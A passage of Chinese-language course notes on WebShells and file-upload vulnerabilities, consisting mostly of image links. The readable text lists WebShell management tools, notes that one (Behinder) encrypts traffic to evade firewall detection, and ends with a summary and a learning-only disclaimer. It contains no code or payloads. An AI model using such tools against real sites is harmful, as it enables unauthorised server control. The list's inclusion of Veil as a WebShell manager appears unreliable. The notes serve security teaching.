![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_675.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_677.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_679.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_680.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_682.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_683.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_685.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_687.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_689.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_691.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_693.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_695.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_697.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_699.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_701.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_703.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_705.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_707.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_709.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_711.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_713.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_715.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_717.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_719.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_721.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_723.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_725.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_727.png)

## WebShell管理工具 🛠️
常见的WebShell管理工具包括：

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_729.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_730.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_732.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_734.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_736.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_738.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_740.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_742.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_744.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_746.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_748.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_749.png)

1.  **中国菜刀**：经典的WebShell管理工具，但已过时。
2.  **C刀**：界面简洁，功能丰富，基于Java开发。
3.  **Veil**：命令行工具，开源项目。
4.  **中国蚁剑**：功能强大的WebShell管理工具。
5.  **冰蝎**：数据加密传输，能绕过防火墙检测。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_751.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_752.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_754.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_756.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_758.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_760.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_762.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_763.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_765.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_767.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_769.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_771.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_773.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_774.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_776.png)

## 总结
在本节课中，我们一起学习了WebShell的基本概念、分类、特点、攻击流程、常见类型、基本原理以及如何通过实际演示来理解和利用这些知识。通过掌握这些内容，我们可以更好地理解文件上传漏洞的危害，并学会如何防范和应对这类攻击。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_778.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_780.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_782.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_784.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_786.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_788.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_790.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_792.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_794.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_796.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_798.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_799.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_801.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_803.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_805.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_807.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_808.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_810.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_812.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_814.png)

**注意**：本教程仅供学习使用，请勿用于非法用途。